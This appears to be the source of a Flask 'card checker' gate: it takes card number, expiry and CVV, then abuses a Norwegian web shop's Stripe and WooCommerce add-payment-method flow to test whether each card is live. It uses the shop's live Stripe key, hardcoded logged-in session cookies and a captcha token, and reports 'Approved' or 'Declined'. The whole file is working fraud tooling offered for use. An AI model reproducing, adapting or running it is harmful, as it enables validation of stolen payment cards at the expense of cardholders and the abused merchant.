from flask import Flask, request, jsonify
import requests
from fake_useragent import UserAgent

app = Flask(__name__)

def process_card(ccx):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "cc": ccx,
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "Declined"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
    
    # Step 1: Create Payment Method with updated headers and data
    print("\n[1] Creating Payment Method...")
    payment_headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user_agent,
    }
    
    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/66fda3a123; stripe-js-v3/66fda3a123; payment-element; deferred-intent',
        'referrer': 'https://www.scandictech.no',
        'time_on_page': '60405',
        'client_attribution_metadata[client_session_id]': '4f807008-3dce-4496-831b-dd1abd452d7c',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': 'b1f29956-4788-4ea0-a758-033d85e30f7e2b6932',
        'muid': 'de7a3623-7b8f-4d0a-9649-bdfd329b77eb9e1ad6',
        'sid': '36c15a5b-8171-4691-a8cf-5929118662a1d27935',
        'key': 'pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf',
        '_stripe_version': '2024-06-20',
        'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoicVBDRi9GMUhLM3RsTzljLzF5S0grZVJNZ1BsS2FlTnVXQ3pzK2M5QVlFc2VqUWk5Tjd5cEdwaUdraUROQlVzK3UydDhDd1FGbXBQRzE5NHR0MWN0Z0ZWSFZuam5ySSs1Z2Yra2pQS2ZQejM4TTV1amdsRk5FUzMxOFNJWEJRK2VqY3BPRUMrdXVlWkRXdC9UVWFsam1qQlRpNE04NGZjRExueGYwS0RoV2JYLzNiNG12alhWM2lvOE4zTFZ4ZWp6OHRab1pRQUpUNUw0QkVPSTIwS2MyM1lwdnVEaFJ4Y0VjWDdYMytoYzI2RHcrYzdyWEZjcXJKMHA4TUlQM1Y5VVNYV1hKZ3dhZDlXS3JSWUpnVitSQm10amYyN1FsUFhTSU14Qko1YkRLd0xBWlFyRGNWNEltKzVneisrK0R2Rkxra1kzdFhxRkh5bzExNE00SFY4ZUx4VW1jZi9oL2xuKzEyOUZheXZjTkxQQTNwdWh0SXQ3amJmU1JaNlhiYjBzU0duSmY0U1dFOVkwZEF2WEU3OW12V2w5V3FzdFk0dGNSQWk5UVlQTmZVVUNHWnludUV2ZEl1UDBoU25mR0Ztc05HOTJrWnhzMURrT3RGczdadTFRenpZTnBSVitoa3U3U2cwUjJvNnBrR1lCTFJBZTJzR01RQlM5cU5UVUVSYklqa2pkU3VKeHphQTNrY1hZWTNLOWhiQk5mYzdYcE1sQjRlaWtoZUV4SWkrTGpjMXdGMHNHanhhaitxRmoxQTdrUmFqYXg5WFVSQkpPQWhxUGY4TGZjNUZQNWRWSHU3T0M4dTR3eVdIMXZ3Yy9Yd3diVFpadGdaQ1F1bHpnVXpFSlpQU0hvbHUvdEl0b25ha2o1Z0pVeUtzeFRINEtVV2RIanlKZFI2UTZ6aGpxdks5UUZOeFZwbVRQYzBsY1RqVUNTdGFGbnhoK2FSTDl4U0tLM1RzZi9HaFdyTENDcTBaVThPWnJuWjVRTFJIeHdFZGVGMnNla3ZOSVNUT0t6anIyMzNzV3RCZDhoSWUwZjh5MHlHYUtZUnhXcHhvcHlhZE5Jbm02N0NMNWVlSlMvSUlkNjdXSjd1ZHhqZVdlUWJweDJwUXVQdlUrWUw5SzVMeUZWQTFKN3lyaDRzcDRkZDRoT04yd3ZJU2pLRkVtQ1JmTFE1SkNRM2MzOVlJd2ZtOC9KUFlHazFJWUcxeHAyMmRPV3BGV0hhbVU1RVp5MGgvQzJLQ21VM05MMjFKUWFPY05WWDdiWmt5cFdYV2srYi9MdWFwdTRxSVBsbnpDdlQrSmhvMndSV2R0MVkzRmRhbEVvQ2VvY1JtSDRnZm5tbUd4TkVZaXBkNU94QlREdkhoQUdqRHhCZDJQUTVuaHlpWnJuQURIbkx0dGdWZCtnS0VEdWxsdmM5N0VvMng1NndJQW5YaVpGNUpzSHF6QlBFSWllYmFsTTAzNkxvd0pmbGFmdS9kdWJ1Q3dnZnJUNk1WRmo2ak1HU0R4Tks2Si9ZQjhTZVFGK2Q4OEdmNHQvNW9TR2ZrYnJKaFErSHpvTzdkTWtqVWdpa2ZLakdKK1huTkI4eG1aZXN2V1NMV0x2Y3pndlNpekZrd1I2Y1NaTFpOK3A5TXlncmxVQklSTEZqbktmM3RPZzZ5aStKZW9MdEZOVWY1SFV1a2ZSaklUTnNEa2VUVExvMUJXcGMrbEVvbVJNZ0krL0NEOVVpZjZRd1JiWnM0Q3V1STVRcnVFK2dSTm1GbFpSM2hzd3VFTVlNZGZTelhjVkNZWVZLZi9vVHB1WmxWc3dxM3Rid1hFTGFsYjMxa2FORzZkRU9tRHBsWTZiUERFT2k2N0ZHak9iaVdMdmZKNzlaUDBRalRWMUFnK3ZaS1IreGV0MXprZ05PeklWQlB4TEVLOUVQVXU4ajlWS2sxK2kzYVI5UDZ4QmxDemxoUFlQd0NhVmpoM1lMUEJ1amRETnhBQWlsU05GNkUyR3F2ZFRPb2YwbGZxejVwSFRjVmNSTnZWT1o0dzhEaFc1dTRJejFGc2RjWDNQMCtTTE1yRUR2ZmdwSU1wZjBzcUxHWkxNMjJ1R2dHRWtETkRKOUZ0blRnaGkzb0FPaklkV3VwcHhiNEh2bGNsbnNDUE5STW1Belk9IiwiZXhwIjoxNzQ4NjYwMDQ2LCJzaGFyZF9pZCI6MjU5MTg5MzU5LCJrciI6IjMxMDkwYjFmIiwicGQiOjAsImNkYXRhIjoiVEdsQXZpVnJXZUVPOU9YZUV5MkFQcTZ3MSt4TkczaG50TlIvK08yRzM2Sm0zS3ZhaG5WN3BQWndmcHB5bmJPVER5TE1SM01GbGNhQ3dQZXpFVWZ2Z0pUVmxWazBIMm5zSTdDZHp4NXFXb250NFdLbzBWcStlTlJkMy9UcXN0NjIzNjhGc2FrTFJFOEdUVVF6NVFKOHJqempQcGFJRnNzaWVpclZVMWFQSWp1YmZpazZqWDdYdGI2RUVVbE1sbjhoQWp1cXFxSTM5NU9uK0R0UiJ9.xeTweLsWXzzgu8RSw04gLVG8HyN1KYD2gMEC8PqyCwM'
    }
    
    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers=payment_headers
        )
        print(f"Payment Method Response: {pm_response.text}")
        
        if 'id' not in pm_response.json():
            return {
                "cc": f"{n}|{mm}|{yy}|{cvc}",
                "response": pm_response.text,
                "status": "Declined"
            }
            
        payment_method_id = pm_response.json()['id']
        print(f"Payment Method ID: {payment_method_id}")
    except Exception as e:
        return {
            "cc": f"{n}|{mm}|{yy}|{cvc}",
            "response": f"Payment Method Creation Failed: {str(e)}",
            "status": "Declined"
        }

    # Step 2: Get Nonce with updated cookies and headers
    print("\n[2] Getting Nonce...")
    cookies = {
        '_ga': 'GA1.1.870077381.1748659850',
        '_fbp': 'fb.1.1748659849717.12516059930301408',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-05-31%2002%3A20%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.scandictech.no%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2025-05-31%2002%3A20%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.scandictech.no%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36',
        'wordpress_logged_in_a55936bd712c3602ee491a391f25dc7d': 'dilego2878%7C1749869461%7C2CajUkygrumKJrUXC3XFxL7p6nNMxFzUqyukoW1sIHU%7C4e6e6ad0896260d6aed4758f2b89d196087d445fdc7d5aa85eaec68d0d7eca6b',
        '__stripe_mid': 'de7a3623-7b8f-4d0a-9649-bdfd329b77eb9e1ad6',
        '__stripe_sid': '36c15a5b-8171-4691-a8cf-5929118662a1d27935',
        'wfwaf-authcookie-a43dff1b9cc598c0761a326e594e12e0': '20657%7Cother%7Cread%7Cc6ac31ebe093f6c8f066cc38c15347c9f07fb3e92f792cdedc6107d81dd04790',
        '_ga_MVDZK3VNMC': 'GS2.1.s1748659849$o1$g1$t1748659860$j49$l0$h0',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.scandictech.no%2Fmy-account%2Fadd-payment-method%2F',
    }
    
    nonce_headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.scandictech.no',
        'priority': 'u=1, i',
        'referer': 'https://www.scandictech.no/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    try:
        nonce_response = requests.get(
            'https://www.scandictech.no/my-account/add-payment-method/',
            cookies=cookies,
            headers=nonce_headers
        )
        print(f"Nonce Page Response: {nonce_response.status_code}")
        
        # Extract nonce from response
        nonce = None
        if 'createAndConfirmSetupIntentNonce' in nonce_response.text:
            nonce = nonce_response.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
            print(f"Extracted Nonce: {nonce}")
        else:
            return {
                "cc": f"{n}|{mm}|{yy}|{cvc}",
                "response": "Failed to extract nonce from page",
                "status": "Declined"
            }
    except Exception as e:
        return {
            "cc": f"{n}|{mm}|{yy}|{cvc}",
            "response": f"Nonce Retrieval Failed: {str(e)}",
            "status": "Declined"
        }

    # Step 3: Create Setup Intent with updated params and data
    print("\n[3] Creating Setup Intent...")
    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }
    
    setup_data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    
    try:
        setup_response = requests.post(
            'https://www.scandictech.no/',
            params=params,
            cookies=cookies,
            headers=nonce_headers,
            data=setup_data
        )
        print(f"Setup Intent Response: {setup_response.text}")
        
        response_json = setup_response.json()
        
        if response_json.get('success', False):
            if response_json['data'].get('status') == 'succeeded':
                status = "Approved"
                response_msg = "Succeeded"
            elif response_json['data'].get('status') == 'requires_action':
                status = "Approved"
                response_msg = "requires_action"
            else:
                status = "Declined"
                response_msg = str(response_json['data'].get('status', 'Unknown status'))
        else:
            status = "Declined"
            error_msg = response_json['data'].get('error', {}).get('message', 'Unknown error')
            response_msg = error_msg if error_msg else str(response_json['data'])
            
        return {
            "cc": f"{n}|{mm}|{yy}|{cvc}",
            "response": response_msg,
            "status": status
        }
    except Exception as e:
        return {
            "cc": f"{n}|{mm}|{yy}|{cvc}",
            "response": f"Setup Intent Failed: {str(e)}",
            "status": "Declined"
        }

@app.route('/gate=stripe3/keydarkwaslost/cc=<cc>', methods=['GET'])
def check_card(cc):
    result = process_card(cc)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3456)
